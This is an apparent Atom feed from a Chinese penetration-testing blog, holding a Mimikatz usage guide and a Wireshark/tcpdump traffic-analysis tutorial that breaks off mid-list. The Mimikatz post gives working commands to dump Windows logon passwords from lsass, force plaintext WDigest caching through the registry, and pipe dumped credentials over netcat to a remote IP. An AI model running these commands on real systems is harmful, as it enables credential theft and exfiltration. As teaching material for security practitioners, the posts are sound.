<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>steady&#39;s blog</title>
  
  <subtitle>深山夕照深秋雨。</subtitle>
  <link href="http://s1eady.top/atom.xml" rel="self"/>
  
  <link href="http://s1eady.top/"/>
  <updated>2020-11-23T02:24:11.835Z</updated>
  <id>http://s1eady.top/</id>
  
  <author>
    <name>steady</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>渗透测试--Mimikatz的使用</title>
    <link href="http://s1eady.top/2020/11/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Mimikatz%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://s1eady.top/2020/11/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Mimikatz%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2020-11-23T02:11:12.000Z</published>
    <updated>2020-11-23T02:24:11.835Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Mimikatz可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码。</p><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><h3 id="获取本地帐户密码"><a href="#获取本地帐户密码" class="headerlink" title="获取本地帐户密码"></a>获取本地帐户密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#提升权限</span><br><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">#抓取密码</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。</p><p>cmd修改注册表命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br><span class="line">#重启或用户重新登录后可以成功抓取</span><br></pre></td></tr></table></figure><h3 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h3><p>当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p>将lsass.dmp下载到本地后，然后执行mimikatz:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure><p>为了方便复制与查看，可以输出到本地文件里面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &gt; pssword.txt</span><br></pre></td></tr></table></figure><h3 id="Mimikatz-使用小技巧"><a href="#Mimikatz-使用小技巧" class="headerlink" title="Mimikatz 使用小技巧"></a>Mimikatz 使用小技巧</h3><h4 id="记录-Mimikatz输出"><a href="#记录-Mimikatz输出" class="headerlink" title="记录 Mimikatz输出"></a>记录 Mimikatz输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit &amp;&amp; dir</span><br></pre></td></tr></table></figure><h4 id="将输出导入到本地文件"><a href="#将输出导入到本地文件" class="headerlink" title="将输出导入到本地文件"></a>将输出导入到本地文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt</span><br></pre></td></tr></table></figure><h4 id="将输出传输到远程机器"><a href="#将输出传输到远程机器" class="headerlink" title="将输出传输到远程机器"></a>将输出传输到远程机器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit | nc.exe -vv 192.168.52.1 4444</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Mimikatz&quot;&gt;&lt;a href=&quot;#Mimikatz&quot; class=&quot;headerlink&quot; title=&quot;Mimikatz&quot;&gt;&lt;/a&gt;Mimikatz&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>流量分析--Wireshark使用</title>
    <link href="http://s1eady.top/2020/11/22/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90--Wireshark%E4%BD%BF%E7%94%A8/"/>
    <id>http://s1eady.top/2020/11/22/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90--Wireshark%E4%BD%BF%E7%94%A8/</id>
    <published>2020-11-22T02:11:12.000Z</published>
    <updated>2020-11-06T11:22:21.348Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1><h2 id="文件导出功能"><a href="#文件导出功能" class="headerlink" title="文件导出功能"></a>文件导出功能</h2><h3 id="http导出功能"><a href="#http导出功能" class="headerlink" title="http导出功能"></a>http导出功能</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/50.png" alt="50"></p><h3 id="foremost分离"><a href="#foremost分离" class="headerlink" title="foremost分离"></a>foremost分离</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost 1.jpg</span><br></pre></td></tr></table></figure><h3 id="tcpxtract"><a href="#tcpxtract" class="headerlink" title="tcpxtract"></a>tcpxtract</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ tcpxtract -f &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;attachment.pcapng</span><br><span class="line">Found file of type &quot;zip&quot; in session [192.168.56.2:4244 -&gt; 192.168.56.104:23825], exporting to 00000000.zip</span><br></pre></td></tr></table></figure><h3 id="NetworkMiner"><a href="#NetworkMiner" class="headerlink" title="NetworkMiner"></a>NetworkMiner</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/49.png" alt="49"></p><h2 id="分析TCP"><a href="#分析TCP" class="headerlink" title="分析TCP"></a>分析TCP</h2><h3 id="tcpick"><a href="#tcpick" class="headerlink" title="tcpick"></a>tcpick</h3><p>由于网络通信协议众多，TCP连接状态众多，所以TCP分析较为复杂。Kali  Linux提供一款专用工具tcpick。该工具支持在线实时嗅探和离线文件嗅探。它可以自动过滤出TCP流，并列出不同出TCP的相关信息，如源和目标地址/端口号、连接状态。该工具可以自动重组流数据，按照不同的格式进行保存。同时，该工具可以在终端以多种显示重组前和重组后的数据包内容，便于用户进行分析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ /usr/sbin/tcpick -C -yP -r attachment.pcapng</span><br><span class="line">Starting tcpick <span class="number">0.2</span><span class="number">.1</span> at <span class="number">2020</span><span class="number">-11</span><span class="number">-05</span> <span class="number">18</span>:<span class="number">42</span> CST</span><br><span class="line">Timeout <span class="keyword">for</span> connections <span class="keyword">is</span> <span class="number">600</span></span><br><span class="line">tcpick: reading <span class="keyword">from</span> attachment.pcapng</span><br><span class="line"><span class="number">1</span>      SYN-SENT       <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line"><span class="number">1</span>      SYN-RECEIVED   <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line"><span class="number">1</span>      ESTABLISHED    <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line">nc -l -p <span class="number">4445</span> &gt; flag.zip</span><br><span class="line"><span class="number">2</span>      SYN-SENT       <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      SYN-RECEIVED   <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      ESTABLISHED    <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line">PK....  ...NdbN..,.%...........flag.txtUT       ....z\..z\ux.............</span><br><span class="line">..(.y..z.. ..F.......:...<span class="comment">#B z..:...YPK....,.%.......PK......    ...NdbN..,.%.........................flag.txtUT.....z\ux.............PK..........N...w.....                                                                                                     </span></span><br><span class="line"><span class="number">2</span>      FIN-WAIT<span class="number">-1</span>     <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      FIN-WAIT<span class="number">-2</span>     <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      TIME-WAIT      <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      CLOSED         <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line">unzip -P supercomplexpassword flag.zip</span><br><span class="line">Archive:  flag.zip</span><br><span class="line">  inflating: flag.txt                </span><br><span class="line"></span><br><span class="line"><span class="number">1</span>      FIN-WAIT<span class="number">-1</span>     <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line"><span class="number">1</span>      TIME-WAIT      <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line"><span class="number">1</span>      CLOSED         <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line">tcpick: done reading <span class="keyword">from</span> attachment.pcapng</span><br><span class="line"></span><br><span class="line"><span class="number">24</span> packets captured                                                                                                             </span><br><span class="line"><span class="number">2</span> tcp sessions detected</span><br></pre></td></tr></table></figure><h2 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h2><h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client -&gt; server: SYN</span><br><span class="line">server -&gt; client: SYN+ACK</span><br><span class="line">client -&gt; server: ACK</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">02:52:44.513700 IP 172.17.0.9.41038 &gt; 93.184.216.34.80: Flags [S] , seq 3310420140,                 length 0</span><br><span class="line">02:52:44.692890 IP 93.184.216.34.80 &gt; 172.17.0.9.41038: Flags [S.], seq 1353235534, ack 3310420141, length 0</span><br><span class="line">02:52:44.692953 IP 172.17.0.9.41038 &gt; 93.184.216.34.80: Flags [.] ,                 ack 1353235535, length 0</span><br></pre></td></tr></table></figure><h4 id="第一次握手-SYN"><a href="#第一次握手-SYN" class="headerlink" title="第一次握手: SYN"></a>第一次握手: SYN</h4><p><code>#1</code> 包含以下信息：</p><ol><li><code>02:52:44.513700</code> 时刻，客户端主动向 server（93.184.216.34）发起一个 SYN 请求，请求建立连接</li><li>客户端请求的<strong>服务端端口是 80</strong>（HTTP 服务默认 80 端口），客户端使用的是<strong>临时端口</strong>（大于 1024）41038</li><li><code>#1</code> 序列号是 <code>3310420140</code>，这是客户端的初始序列号（客户端和服务端分别维护自己的序列号，两者没有关系；另外，初始序列号是系统选择的，一般不是 0）</li><li><code>#1</code> length 为 0，因为 SYN 包不带 TCP payload，所有信息都在 TCP header</li></ol><h4 id="第二次握手-SYN-ACK"><a href="#第二次握手-SYN-ACK" class="headerlink" title="第二次握手: SYN+ACK"></a>第二次握手: SYN+ACK</h4><p><code>#2</code> 的 ack 是 <code>3310420140</code>，等于 <code>#1</code> 的 seq 加 1，这就说明，<code>#2</code> 是 <code>#1</code> 的应 答包。</p><p>这个应答包的特点：</p><ol><li>TCP flags 为 <code>S.</code>，即 SYN+ACK</li><li>length 也是 0，说明没有 payload</li><li>seq 为 <code>1353235534</code>，这是<strong>服务端的初始序列号</strong></li><li>到达 eth0 的时间为 <code>02:52:44.692890</code>，说明时间过了 <code>18ms</code></li></ol><h4 id="第三次握手-ACK"><a href="#第三次握手-ACK" class="headerlink" title="第三次握手: ACK"></a>第三次握手: ACK</h4><p>同理，<code>#3</code> 的 ack 等于 <code>#2</code> 的 seq 加 1，说明 <code>#3</code> 是 <code>#2</code> 的应答包。</p><p>这个包的特点：</p><ol><li>TCP flags 为 <code>.</code>，即 ACK</li><li>长度为 0，说明没有 TCP payload</li></ol><p>至此，三次握手完成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ /usr/sbin/tcpdump  -n -r nmapll.pcapng <span class="string">&#x27;tcp[13] = 18&#x27;</span> |  awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span>| sort -u</span><br><span class="line">reading <span class="keyword">from</span> file nmapll.pcapng, link-type EN10MB (Ethernet)</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.21</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.22</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.3306</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.631</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.801</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ /usr/sbin/tcpdump  -r nmapll.pcapng <span class="string">&#x27;tcp[13] = 18&#x27;</span> |  awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span>| sort -u</span><br><span class="line">reading <span class="keyword">from</span> file nmapll.pcapng, link-type EN10MB (Ethernet)</span><br><span class="line">localhost<span class="number">.801</span></span><br><span class="line">localhost.ftp</span><br><span class="line">localhost.ipp</span><br><span class="line">localhost.mysql</span><br><span class="line">localhost.ssh</span><br></pre></td></tr></table></figure><h3 id="输出分析"><a href="#输出分析" class="headerlink" title="输出分析"></a>输出分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ tcpdump -r attachment.pcapng | head -n 10</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">14</span>:<span class="number">29</span>:<span class="number">32.848771</span> IP <span class="number">192.168</span><span class="number">.10</span><span class="number">.212</span><span class="number">.43424</span> &gt; li370<span class="number">-223.</span>members.linode.com.https: Flags [S], seq <span class="number">3990734865</span>, win <span class="number">29200</span>, options [mss <span class="number">1460</span>,sackOK,TS val <span class="number">668024057</span> ecr <span class="number">0</span>,nop,wscale <span class="number">7</span>], length <span class="number">0</span></span><br></pre></td></tr></table></figure><ul><li>packet <strong>时间戳</strong>，例如 <code>02:52:44.513700</code> 表示抓到这个包的时间是** 02 时 52 分 44 秒 513 毫秒**</li><li>packet <strong>类型</strong>，这里是 <code>IP</code> 包</li><li>源 (SRC) IP 和端口，目的 (DST) IP 和端口</li><li>packet TCP flags，其中<ul><li><code>S</code> 表示 <code>syn</code> 包</li><li><code>.</code> 表示 <code>ack</code> 包</li><li><code>F</code> 表示 <code>fin</code> 包</li><li><code>P</code> 表示 <code>push</code> 包（发送正常数据）</li></ul></li><li>序列号（seq）</li><li>应答号（ack）</li><li>包的 payload 长度</li><li>包的部分内容（ASCII）</li></ul><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-n  不对地址(比如, 主机地址, 端口号)进行数字表示到名字表示的转换.默认情况下，tcpdump抓包结果中将进行域名解析，显示的是域名地址而非ip地址，使用-n选项，可指定显示ip地址</span><br><span class="line">-r  file</span><br><span class="line">    从文件file 中读取包数据. 如果file 字段为 &#39;-&#39; 符号, 则tcpdump 会从标准输入中读取包数据.</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">-A  以ASCII码方式显示每一个数据包(不会显示数据包中链路层头部信息). 在抓取包含</span><br><span class="line">    网页数据的数据包时, 可方便查看数据(nt: 即Handy <span class="keyword">for</span> capturing web pages).</span><br><span class="line">-c  count</span><br><span class="line">    tcpdump将在接受到count个数据包后退出.</span><br><span class="line">-C  file-size</span><br><span class="line">    (nt: 此选项用于配合-w file 选项使用)</span><br><span class="line">    该选项使得tcpdump 在把原始数据包直接保存到文件中之前, 检查此文件大小是否超过file-size. 如果超过了, 将关闭此文件,</span><br><span class="line">    另创一个文件继续用于原始数据包的记录. 新创建的文件名与-w 选项指定的文件名一致, 但文件名后多了一个数字.</span><br><span class="line">    该数字会从<span class="number">1</span>开始随着新创建文件的增多而增加. file-size的单位是百万字节(nt: 这里指<span class="number">1</span>,<span class="number">000</span>,<span class="number">000</span>个字节,</span><br><span class="line">    并非<span class="number">1</span>,<span class="number">048</span>,<span class="number">576</span>个字节, 后者是以<span class="number">1024</span>字节为<span class="number">1</span>k, <span class="number">1024</span>k字节为<span class="number">1</span>M计算所得, 即<span class="number">1</span>M=<span class="number">1024</span> ＊ <span class="number">1024</span> ＝ <span class="number">1</span>,<span class="number">048</span>,<span class="number">576</span>)</span><br><span class="line">-d  以容易阅读的形式,在标准输出上打印出编排过的包匹配码, 随后tcpdump停止.(nt | rt: human readable, 容易阅读的,</span><br><span class="line">    通常是指以ascii码来打印一些信息. compiled, 编排过的. packet-matching code, 包匹配码,含义未知, 需补充)</span><br><span class="line">-dd 以C语言的形式打印出包匹配码.</span><br><span class="line">-ddd    以十进制数的形式打印出包匹配码(会在包匹配码之前有一个附加的<span class="string">&#x27;count&#x27;</span>前缀).</span><br><span class="line">-D  打印系统中所有tcpdump可以在其上进行抓包的网络接口. 每一个接口会打印出数字编号, 相应的接口名字, 以及可能的一个网络接口</span><br><span class="line">    描述. 其中网络接口名字和数字编号可以用在tcpdump 的-i flag 选项(nt: 把名字或数字代替flag), 来指定要在其上抓包的网络</span><br><span class="line">    接口.</span><br><span class="line">    此选项在不支持接口列表命令的系统上很有用(nt: 比如, Windows 系统, 或缺乏 ifconfig -a 的UNIX系统); 接口的数字</span><br><span class="line">    编号在windows <span class="number">2000</span> 或其后的系统中很有用, 因为这些系统上的接口名字比较复杂, 而不易使用.</span><br><span class="line">    如果tcpdump编译时所依赖的libpcap库太老,-D 选项不会被支持, 因为其中缺乏 pcap_findalldevs()函数.</span><br><span class="line">-e  每行的打印输出中将包括数据包的数据链路层头部信息</span><br><span class="line">-E  spi@ipaddr algo:secret,...</span><br><span class="line">    可通过spi@ipaddr algo:secret 来解密IPsec ESP包(nt | rt:IPsec Encapsulating Security Payload,</span><br><span class="line">    IPsec 封装安全负载, IPsec可理解为, 一整套对ip数据包的加密协议, ESP 为整个IP 数据包或其中上层协议部分被加密后的数据,</span><br><span class="line">    前者的工作模式称为隧道模式; 后者的工作模式称为传输模式 . 工作原理, 另需补充).</span><br><span class="line">    需要注意的是, 在终端启动tcpdump 时, 可以为IPv4 ESP packets 设置密钥(secret）.</span><br><span class="line">    可用于加密的算法包括des-cbc, <span class="number">3</span>des-cbc, blowfish-cbc, rc3-cbc, cast128-cbc, 或者没有(none).</span><br><span class="line">    默认的是des-cbc(nt: des, Data Encryption Standard, 数据加密标准, 加密算法未知, 另需补充).</span><br><span class="line">    secret 为用于ESP 的密钥, 使用ASCII 字符串方式表达. 如果以 <span class="number">0</span>x 开头, 该密钥将以<span class="number">16</span>进制方式读入.</span><br><span class="line">    该选项中ESP 的定义遵循RFC2406, 而不是 RFC1827. 并且, 此选项只是用来调试的, 不推荐以真实密钥(secret)来</span><br><span class="line">    使用该选项, 因为这样不安全: 在命令行中输入的secret 可以被其他人通过ps 等命令查看到.</span><br><span class="line">    除了以上的语法格式(nt: 指spi@ipaddr algo:secret), 还可以在后面添加一个语法输入文件名字供tcpdump 使用</span><br><span class="line">    (nt：即把spi@ipaddr algo:secret,... 中...换成一个语法文件名). 此文件在接受到第一个ESP　包时会打开此</span><br><span class="line">    文件, 所以最好此时把赋予tcpdump 的一些特权取消(nt: 可理解为, 这样防范之后, 当该文件为恶意编写时,</span><br><span class="line">    不至于造成过大损害).</span><br><span class="line">-f  显示外部的IPv4 地址时(nt: foreign IPv4 addresses, 可理解为, 非本机ip地址), 采用数字方式而不是名字.</span><br><span class="line">    (此选项是用来对付Sun公司的NIS服务器的缺陷(nt: NIS, 网络信息服务, tcpdump 显示外部地址的名字时会</span><br><span class="line">    用到她提供的名称服务): 此NIS服务器在查询非本地地址名字时,常常会陷入无尽的查询循环).</span><br><span class="line">    由于对外部(foreign)IPv4地址的测试需要用到本地网络接口(nt: tcpdump 抓包时用到的接口)</span><br><span class="line">    及其IPv4 地址和网络掩码. 如果此地址或网络掩码不可用, 或者此接口根本就没有设置相应网络地址和网络</span><br><span class="line">    掩码(nt: linux 下的 <span class="string">&#x27;any&#x27;</span> 网络接口就不需要设置地址和掩码, 不过此<span class="string">&#x27;any&#x27;</span>接口可以收到系统中所有接口的</span><br><span class="line">    数据包), 该选项不能正常工作.</span><br><span class="line">-F  file</span><br><span class="line">    使用file 文件作为过滤条件表达式的输入, 此时命令行上的输入将被忽略.</span><br><span class="line">-i  interface</span><br><span class="line">    指定tcpdump 需要监听的接口.  如果没有指定, tcpdump 会从系统接口列表中搜寻编号最小的已配置好的接口(不包括 loopback 接口).</span><br><span class="line">    一但找到第一个符合条件的接口, 搜寻马上结束.</span><br><span class="line">    在采用<span class="number">2.2</span>版本或之后版本内核的Linux 操作系统上, <span class="string">&#x27;any&#x27;</span> 这个虚拟网络接口可被用来接收所有网络接口上的数据包</span><br><span class="line">    (nt: 这会包括目的是该网络接口的, 也包括目的不是该网络接口的). 需要注意的是如果真实网络接口不能工作在<span class="string">&#x27;混杂&#x27;</span>模式(promiscuous)下,</span><br><span class="line">    则无法在<span class="string">&#x27;any&#x27;</span>这个虚拟的网络接口上抓取其数据包.</span><br><span class="line">    如果 -D 标志被指定, tcpdump会打印系统中的接口编号，而该编号就可用于此处的interface 参数.</span><br><span class="line">-l  对标准输出进行行缓冲(nt: 使标准输出设备遇到一个换行符就马上把这行的内容打印出来).</span><br><span class="line">    在需要同时观察抓包打印以及保存抓包记录的时候很有用. 比如, 可通过以下命令组合来达到此目的:</span><br><span class="line">    ``tcpdump  -l  |  tee dat<span 